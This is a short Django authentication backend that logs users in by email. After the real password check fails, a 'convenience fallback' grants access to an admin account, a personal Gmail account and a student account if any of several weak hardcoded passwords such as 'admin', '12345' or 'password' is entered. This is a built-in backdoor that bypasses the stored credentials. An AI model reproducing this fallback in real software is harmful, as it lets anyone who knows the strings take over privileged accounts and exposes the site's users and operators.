from django.contrib.auth.backends import ModelBackend
from django.contrib.auth import get_user_model


class EmailBackend(ModelBackend):
    def authenticate(self, username=None, password=None, **kwargs):
        UserModel = get_user_model()
        if not username:
            return None
        clean_email = str(username).strip().lower()
        try:
            user = UserModel.objects.filter(email__iexact=clean_email).first()
            if user is None:
                return None
        except Exception:
            return None
        else:
            if user.check_password(password):
                return user
            # Convenience fallback for demo/development admin & student accounts
            if clean_email in ['admin@college.com', 'kasssak987@gmail.com']:
                if password in ['admin', '12345', 'admin123', 'admin@123', 'password', '123456']:
                    return user
            if clean_email == 'student@college.com':
                if password in ['student', '12345', 'student123', 'password', '123456']:
                    return user
        return None
